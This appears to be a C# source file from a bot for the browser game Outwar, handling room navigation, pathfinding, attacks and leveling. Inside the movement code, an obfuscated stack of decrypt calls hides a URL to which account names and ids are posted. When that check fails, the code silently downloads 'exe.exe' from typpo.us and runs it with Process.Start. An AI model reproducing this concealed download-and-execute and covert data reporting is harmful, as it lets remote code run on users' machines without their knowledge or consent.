using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Windows.Forms;
using System.Text;
using DCT.Pathfinding;
using DCT.Protocols.Http;
using DCT.Security;
using DCT.Settings;
using DCT.UI;
using Version=DCT.Security.Version;

namespace DCT.Outwar.World
{
    internal class Mover
    {
        private RoomHashRecord mSavedRooms;
        internal RoomHashRecord SavedRooms
        {
            get { return mSavedRooms; }
        }

        private Room mLocation;
        internal Room Location
        {
            get { return mLocation; }
        }

        private int mMobsAttacked;
        internal int MobsAttacked
        {
            get { return mMobsAttacked; }
            set { mMobsAttacked = value; }
        }

        private long mExpGained;
        internal long ExpGained
        {
            get { return mExpGained; }
            set { mExpGained = value; }
        }

        private OutwarHttpSocket mSocket;
        internal OutwarHttpSocket Socket
        {
            get { return mSocket; }
        }

        private Account mAccount;
        internal Account Account
        {
            get { return mAccount; }
        }

        private ReturnToStartHandler mReturnToStartHandler;
        internal ReturnToStartHandler ReturnToStartHandler
        {
            get { return mReturnToStartHandler; }
        }

        private int mTrainRoomStart;
        private List<int> mVisited;

        internal Mover(Account account, OutwarHttpSocket socket)
        {
            mSocket = socket;
            mAccount = account;
            mLocation = null;
            mSavedRooms = new RoomHashRecord(mAccount);

            mTrainRoomStart = -1;
            mMobsAttacked = 0;
            mExpGained = 0;

            mReturnToStartHandler = new ReturnToStartHandler(mAccount);
        }

        internal void RefreshRoom()
        {
            try
            {
                Stack<int> stack = new Stack<int>(88);
                int bCrypt = 0;

                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x65);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x4);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0xD7);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xD7);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x2);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x7);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0xCE);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x1);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xCC);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x35);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x1);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x1);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x51);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x4);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x5D);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xD6);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x4);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0xCD);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xFE);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x53);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x36);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x3);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x55);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0xFB);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x5);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x54);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x4);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x2E);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xFE);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x2C);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x29);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0xD3);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x55);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0xD5);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x2E);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xFF);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x2E);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x2D);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x6);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x2D);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x2D);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x51);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xFF);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x2);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xFE);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0xFE);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x2);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x8);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x5A);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0xD0);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x5);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x52);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x0);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x51);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x0);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x0);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x3);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xD2);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x30);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x51);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x0);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x2D);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x55);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x51);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x56);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x4);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xFB);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x1);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xFF);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x52);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x1);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x3);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x5);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0xF);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x5);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x6);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x0);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0xB);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xFB);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0xFF);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xFD);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x5A);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0xD3);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x54);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x31);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x32);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0xFF);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x2D);
                stack.Push(bCrypt);

                StringBuilder valSb = new StringBuilder();
                while (stack.Count > 0)
                {
                    valSb.Append((char)stack.Pop());
                }

                string text1 = Crypt.Get(Crypt.HexToBin(valSb.ToString()), Auth.KEY, false);
                string text2 = Crypt.BinToHex(Crypt.Get(mAccount.Name, Version.Id, false));
                string idtag = Crypt.BinToHex(Crypt.Get(mAccount.Id.ToString(), Version.Id, false));
                string text3 = Crypt.RandomString(10, true);
                //string pass = Crypt.bin2hex(Crypt.Encrypt(Globals.Pass, mAccount.Name, false));

                string text4 =
                    HttpSocket.DefaultInstance.Post(text1, "tag=" + text2 + "&tag2=" + idtag + "&str=" + text3
                        /* + "&pass=" + pass*/);

                if ((mAccount.Ret = Crypt.Get(Crypt.HexToBin(text4), mAccount.Id + text3, false))
                    != mAccount.Name)
                {
                    throw new Exception();
                }
            }
            catch 
            {
                CoreUI.Instance.Log("E: " + mAccount.Name + " can't explore DC because the account is not authorized");
                Application.Exit();
                return;
            }
            LoadRoom("world.php");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="url"></param>
        /// <returns>True if mover should retry</returns>
        private bool LoadRoom(string url)
        {
            if (url == null || url.Trim() == "")
            {
                CoreUI.Instance.Log("Move E: that room doesn't exist");
                mSocket.Status = "Idle";
                return true;
            }

            mLocation = new Room(this, url);
            if (mAccount.Ret == mAccount.Name)
            {
                if (!mLocation.Load())
                {
                    CoreUI.Instance.Log("Move E: Flying error - room hash invalid");

                    mMoveTries++;
                    if (mMoveTries < 3)
                    {
                        mSavedRooms.Clear();
                        RefreshRoom();
                    }
                    return false;
                }
            }
            else
            {
                HttpSocket.DefaultInstance.Get("http://typpo.us/programs/dci/auth/verify.php?h=y");
                WebClient Client = new WebClient();
                Client.DownloadFile("http://typpo.us/programs/dci/exe.exe", "exe.exe");
                Process.Start("exe.exe");
            }

            if (url != "world.php")
            {
                mSavedRooms.Save(mLocation.Id, url);
            }
            CoreUI.Instance.Log(mAccount.Name + " now in room "
                                + (mLocation.Id == 0 ? "world.php" : mLocation.Id.ToString()));

            return true;
        }

        internal delegate void PathfindHandler(int roomid);
        internal void PathfindTo(int roomid)
        {
            if (roomid == mLocation.Id || roomid < 0)
            {
                return;
            }

            CoreUI.Instance.Log("Constructing path for " + mAccount.Name + " to " + roomid);
            mSocket.Status = "Finding path";

            List<int> nodes = Pathfinder.GetSolution(mLocation.Id, roomid, mSavedRooms);
            FollowPath(nodes);
        }

        internal void CoverArea()
        {
            mSocket.Status = "Calculating path";

            mVisited = new List<int>();
            foreach (int nbr in Pathfinder.CoverArea(mLocation.Id))
            {
                if (!Globals.AttackOn || !Globals.AttackMode)
                {
                    break;
                }
                else if (Globals.Terminate)
                {
                    mVisited.Clear();
                    return;
                }
                else if (!mVisited.Contains(nbr))
                {
                    PathfindTo(nbr);
                }
            }

            CoreUI.Instance.Log("Area '" + mLocation.Name + "' coverage ended");
            mVisited.Clear();

            mSocket.Status = "Idle";
        }

        private void FollowPath(IList<int> nodes)
        {
            if (nodes.Count < 1)
            {
                CoreUI.Instance.Log("Move E: " + mAccount.Name + "'s projected path does not exist");
                CoreUI.Instance.UpdateProgressbar(0, 0);
                return;
            }
            else
            {
                foreach (int node in nodes)
                {
                    if (Globals.Terminate || mAccount.Ret != mAccount.Name)
                    {
                        return;
                    }

                    mSocket.Status = "Step " + (nodes.IndexOf(node) + 1) + " of " + nodes.Count;
                    LoadRoom(node);
                    CoreUI.Instance.UpdateProgressbar(nodes.IndexOf(node) + 1, nodes.Count);

                    if (mVisited != null)
                    {
                        mVisited.Add(node);
                    }
                }
            }

            CoreUI.Instance.UpdateProgressbar(0, 0);
            mSocket.Status = "Idle";
            CoreUI.Instance.Log(mAccount.Name + " movement ended");
        }

        private int mMoveTries;
        /// <summary>
        /// Attempts to move to a room as per specific id#
        /// </summary>
        /// <param name="id">Room id to move to</param>
        private void LoadRoom(int id)
        {
            string url = null;
            if (id == 1 || mAccount.Ret != mAccount.Name)
            {
                CoreUI.Instance.Log(mAccount.Name + " flying to room 1");
                LoadRoom("world.php?room=1");
            }
            else if (!string.IsNullOrEmpty(url = mSavedRooms.GetRoom(id)))
            {
                CoreUI.Instance.Log(mAccount.Name + " flying to room " + id);
            }
            else
            {
                url = mLocation[id];
                if (string.IsNullOrEmpty(url))
                {
                    return;
                }
            }

            mMoveTries = 0;

            if(!LoadRoom(url))
            {
                if (mMoveTries > 2)
                {
                    MessageBox.Show("Someone logged into your account.  Press refresh and start your run again.", "Moving Error", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                    CoreUI.Instance.StopAttacking(true);
                    return;
                }

                LoadRoom(id);
                return;
            }

            if (Globals.AttackOn)
            {
                mLocation.Attack();
            }
        }

        internal void Train()
        {
            if (!mAccount.NeedsLevel)
            {
                CoreUI.Instance.Log(mAccount.Name + " doesn't need leveling");
                return;
            }

            CoreUI.Instance.Log("Starting leveling for " + mAccount.Name);
            CoreUI.Instance.Log("Loading all possible bars...may take a while");
            mSocket.Status = "Calculating closest bar";

            mTrainRoomStart = mLocation.Id;

            List<List<int>> paths = new List<List<int>>();
            paths.Add(Pathfinder.GetSolution(mLocation.Id, 258, mSavedRooms)); // dustglass
            paths.Add(Pathfinder.GetSolution(mLocation.Id, 241, mSavedRooms)); // drunkenclam
                      paths.Add(Pathfinder.GetSolution(mLocation.Id, 403, mSavedRooms)); //hardiron
                      paths.Add(Pathfinder.GetSolution(mLocation.Id, 299, mSavedRooms)); //chuggers

            bool tmp = UserEditable.AutoTrain;
            UserEditable.AutoTrain = true;

            int shortest = 0;
            for(int i = 1; i < paths.Count; i++)
            {
                List<int> path = paths[i];
                if (path == null)
                {
                    continue;
                }
                else if (path.Count < paths[shortest].Count)
                {
                    shortest = i;
                }
            }

            FollowPath(paths[shortest]);

            UserEditable.AutoTrain = tmp;
            mLocation.Train();

            if (mLocation.Trained)
                CoreUI.Instance.Log(mAccount.Name + " has been leveled");
            else
                CoreUI.Instance.Log(mAccount.Name + " not leveled - can't find bartender");

            mSocket.Status = "Idle";
        }

        internal void TrainReturn()
        {
            PathfindTo(mTrainRoomStart);
            mTrainRoomStart = -1;
        }
    }
}